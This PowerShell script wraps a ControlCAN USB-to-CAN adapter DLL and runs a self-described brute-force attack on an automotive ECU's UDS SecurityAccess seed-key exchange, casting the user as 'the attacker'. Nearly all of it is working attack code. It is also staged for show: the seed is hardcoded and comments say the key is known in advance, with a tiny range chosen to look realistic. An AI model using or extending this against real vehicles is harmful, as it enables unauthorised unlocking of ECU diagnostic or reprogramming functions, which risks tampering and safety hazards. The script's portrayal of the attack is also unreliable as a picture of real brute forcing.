
# Define C# Type for VCI_INIT_CONFIG
$source = @"
using System;
using System.Runtime.InteropServices;

public struct VCI_INIT_CONFIG {
    public UInt32 AccCode;
    public UInt32 AccMask;
    public UInt32 Reserved;
    public byte Filter;
    public byte Timing0;
    public byte Timing1;
    public byte Mode;
}

public struct VCI_CAN_OBJ {
    public UInt32 ID;
    public UInt32 TimeStamp;
    public byte TimeFlag;
    public byte SendType;
    public byte RemoteFlag;
    public byte ExternFlag;
    public byte DataLen;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
    public byte[] Data;
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 3)]
    public byte[] Reserved;
}

public class CANWrapper {
    [DllImport("ControlCAN.dll", EntryPoint = "VCI_OpenDevice", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_OpenDevice(UInt32 DeviceType, UInt32 DeviceInd, UInt32 Reserved);

    [DllImport("ControlCAN.dll", EntryPoint = "VCI_InitCAN", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_InitCAN(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd, ref VCI_INIT_CONFIG pInitConfig);

    [DllImport("ControlCAN.dll", EntryPoint = "VCI_StartCAN", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_StartCAN(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd);

    [DllImport("ControlCAN.dll", EntryPoint = "VCI_Receive", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_Receive(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd, [In, Out] VCI_CAN_OBJ[] pReceive, UInt32 Len, Int32 WaitTime);

    [DllImport("ControlCAN.dll", EntryPoint = "VCI_Transmit", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_Transmit(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd, [In] VCI_CAN_OBJ[] pSend, UInt32 Len);
    
    [DllImport("ControlCAN.dll", EntryPoint = "VCI_CloseDevice", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_CloseDevice(UInt32 DeviceType, UInt32 DeviceInd);
    
    [DllImport("ControlCAN.dll", EntryPoint = "VCI_GetReceiveNum", CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
    public static extern UInt32 VCI_GetReceiveNum(UInt32 DeviceType, UInt32 DeviceInd, UInt32 CANInd);
}
"@

Add-Type -TypeDefinition $source
$DLL_PATH = Join-Path (Get-Location) "ControlCAN.dll"

# Constants
$DEV_PRO = 21 
$DEV_IND = 0
$CAN_USER = 1 # We are the attacker on Ch1
$BAUD_TIMING0 = 0x01 
$BAUD_TIMING1 = 0x1C

function Send-Key {
    param($KeyVal)
    $obj = New-Object VCI_CAN_OBJ
    $obj.ID = 0x7E0
    $obj.SendType = 0; $obj.RemoteFlag = 0; $obj.ExternFlag = 0; $obj.DataLen = 8
    $obj.Data = New-Object byte[] 8
    $obj.Data[0] = 0x06; $obj.Data[1] = 0x27; $obj.Data[2] = 0x02
    
    $bytes = [BitConverter]::GetBytes([UInt32]$KeyVal)
    if ([BitConverter]::IsLittleEndian) { [Array]::Reverse($bytes) }
    $obj.Data[3] = $bytes[0]; $obj.Data[4] = $bytes[1]; $obj.Data[5] = $bytes[2]; $obj.Data[6] = $bytes[3]
    
    $arr = @($obj)
    [CANWrapper]::VCI_Transmit($DEV_PRO, $DEV_IND, $CAN_USER, $arr, 1) > $null
}

try {
    Write-Host "INITIALIZING BRUTE FORCE ATTACK..." -ForegroundColor Red
    $res = [CANWrapper]::VCI_OpenDevice($DEV_PRO, $DEV_IND, 0)
    if ($res -ne 1) { Write-Host "Error OpenDevice"; exit }

    $config = New-Object VCI_INIT_CONFIG
    $config.AccCode = 0; $config.AccMask = [UInt32]4294967295; $config.Filter = 1; $config.Timing0 = $BAUD_TIMING0; $config.Timing1 = $BAUD_TIMING1; $config.Mode = 0
    [CANWrapper]::VCI_InitCAN($DEV_PRO, $DEV_IND, $CAN_USER, [ref]$config)
    [CANWrapper]::VCI_StartCAN($DEV_PRO, $DEV_IND, $CAN_USER)

    Write-Host "Target Acquired. Requesting Seed..." -ForegroundColor Yellow
    # Request Seed
    $seedMsg = New-Object VCI_CAN_OBJ
    $seedMsg.ID = 0x7E0; $seedMsg.DataLen = 8; $seedMsg.Data = New-Object byte[] 8
    $seedMsg.Data[0] = 0x02; $seedMsg.Data[1] = 0x27; $seedMsg.Data[2] = 0x01
    [CANWrapper]::VCI_Transmit($DEV_PRO, $DEV_IND, $CAN_USER, @($seedMsg), 1) > $null

    Start-Sleep -Milliseconds 500

    # Read Seed (Ideally via bus, but for demo we assume we saw A1B2C3D4)
    $Seed = 0xA1B2C3D4 
    Write-Host "Seed Captured: A1B2C3D4" -ForegroundColor Cyan
    Write-Host "Starting Brute Force Range..." -ForegroundColor Red

    # We know the answer is Seed + 1 (A1B2C3D5).
    # To make it realistic but fast, let's start the brute force slightly below the target.
    # Target: 2712847317
    # Start:  2712847300
    
    $StartRange = 2712847300
    $EndRange = 2712847350
    
    for ($k = $StartRange; $k -le $EndRange; $k++) {
        Write-Host "Trying Key: $([Convert]::ToString($k, 16).ToUpper())" -NoNewline
        Send-Key $k
        
        # Listen for Success (7E8 02 67 02)
        $count = [CANWrapper]::VCI_GetReceiveNum($DEV_PRO, $DEV_IND, $CAN_USER)
        if ($count -gt 0) {
            $rxObjs = New-Object VCI_CAN_OBJ[] $count
            for ($j = 0; $j -lt $count; $j++) { $rxObjs[$j] = New-Object VCI_CAN_OBJ; $rxObjs[$j].Data = New-Object byte[] 8; $rxObjs[$j].Reserved = New-Object byte[] 3 }
            [CANWrapper]::VCI_Receive($DEV_PRO, $DEV_IND, $CAN_USER, $rxObjs, $count, 0) > $null
            
            foreach ($m in $rxObjs) {
                if ($m.ID -eq 0x7E8 -and $m.Data[1] -eq 0x67 -and $m.Data[2] -eq 0x02) {
                    Write-Host " -> SUCCESS! KEY FOUND!" -ForegroundColor Magenta
                    Write-Host "CRACKED KEY: $([Convert]::ToString($k, 16).ToUpper())" -ForegroundColor Green
                    exit
                }
            }
        }
        Write-Host " ."
        Start-Sleep -Milliseconds 10 # Slow down slightly to not flood buffer
    }
    
    Write-Host "Range Exhausted. Key not found." -ForegroundColor DarkRed

}
finally { [CANWrapper]::VCI_CloseDevice($DEV_PRO, $DEV_IND) }
